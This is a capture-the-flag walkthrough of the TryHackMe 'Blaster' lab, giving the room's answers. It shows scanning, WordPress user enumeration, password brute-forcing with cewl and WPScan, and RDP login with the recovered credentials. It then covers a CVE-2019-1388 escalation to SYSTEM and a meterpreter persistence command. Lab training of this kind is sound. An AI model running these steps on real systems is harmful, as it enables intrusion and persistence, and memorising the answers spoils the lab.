# TryHackMe Blaster - Windows

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -sC -sV -O -Pn -p- 10.10.133.249
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 10:24 EDT
Nmap scan report for 10.10.133.249
Host is up (0.22s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2022-04-15T14:29:21+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2022-04-14T14:17:11
|_Not valid after:  2022-10-14T14:17:11
|_ssl-date: 2022-04-15T14:29:25+00:00; +2s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 311.83 seconds
```

- **QUESTION: How many ports are open on our target system?** `2`

## Initial Foothold

### Port 80

![image](https://user-images.githubusercontent.com/96747355/163584259-87b22b24-325f-44d1-9c38-52324d7eb40c.png)  

- **QUESTION: Looks like there's a web server running, what is the title of the page we discover when browsing to it?** `IIS Windows Server`

- Gobuster

```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.133.249/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.133.249/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/15 10:39:12 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 150] [--> http://10.10.133.249/retro/]
```


- **QUESTION: Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover? ** `/retro`

- We have a `/retro` page, let's have a look  

![image](https://user-images.githubusercontent.com/96747355/163584609-ed1bb0ea-a6a9-409a-8c1f-19e787abbbcd.png)  

- This is obviously a Wordpress, by looking around we know we have a username `Wade`  

![image](https://user-images.githubusercontent.com/96747355/163605946-a5929af1-3926-4502-ad7a-2468c1bc37ed.png)

- Let's run WPScan **[OPTIONAL BUT FUN :D]**  

```
┌──(root💀kali)-[~]
└─# wpscan --url http://10.10.133.249/retro --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.133.249/retro/ [10.10.133.249]
[+] Started: Fri Apr 15 10:48:25 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.133.249/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.133.249/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.133.249/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.133.249/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.133.249/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://10.10.133.249/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://10.10.133.249/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://10.10.133.249/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.133.249/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:27 <=============================================================================================================================================================> (468 / 468) 100.00% Time: 00:00:27
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:27 <===========================================================================================================================================================> (2575 / 2575) 100.00% Time: 00:02:27

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <==============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:04 <====================================================================================================================================================================> (71 / 71) 100.00% Time: 00:00:04

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:37 <=========================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:37

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:05 <===============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:05

[i] User(s) Identified:

[+] wade
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.133.249/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Wade
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr 15 10:52:28 2022
[+] Requests Done: 3375
[+] Cached Requests: 39
[+] Data Sent: 966.681 KB
[+] Data Received: 510.738 KB
[+] Memory used: 278.281 MB
[+] Elapsed time: 00:04:02
```
- No other usernames are found. Let's try to bruteforce login
- **QUESTION: Navigate to our discovered hidden directory, what potential username do we discover?** `wade`
- Method 1: bruteforce with cewl
    - Let's generate a list of pass using cewl `cewl http://10.10.133.249/retro/ > pass.txt`
    - Let's bruteforce with wpscan `wpscan --url http://10.10.133.249/retro --passwords Documents/tryhackme/blaster/pass.txt --usernames wade`
```
[!] Valid Combinations Found:
 | Username: wade, Password: parzival
```

- Method 2: having a look at the comments
  - We find a note wade left to himselg `Leaving myself a note here just in case I forget how to spell it: parzival`
- Connect to wordpress we can now go to the wordpress and login using the found password `wade:parzival` **[OPTIONAL BUT FUN :D]** 
- **QUESTION Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?** `parzival`

### RDP

- Let's try to connect to rdp with the same credentials `xfreerdp /u:wade /v:10.10.191.161 /p:parzival`
- It works!  
![image](https://user-images.githubusercontent.com/96747355/163605244-c67f9082-785d-4076-814a-b6ee5e1639f5.png)  
- **Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?** - I let you find this one on your own :D 

## Privesc

- **When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?** `cve-2019-1388`
- **Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?** `hhupd`
- [Here](https://www.youtube.com/watch?v=3BQKpPNlTSo&ab_channel=ZeroDayInitiative) is the video that shows how to use this exploit for privesc
- **Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?** `nt authority\system`
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\System32>whoami
nt authority\system
C:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt
[STRIPPED]
```
- **Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!** - I let you answer this question on your own :)

## Persistence

- Follow up the questions on THM and work accordingly
- **Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. ** `run persistence -X`
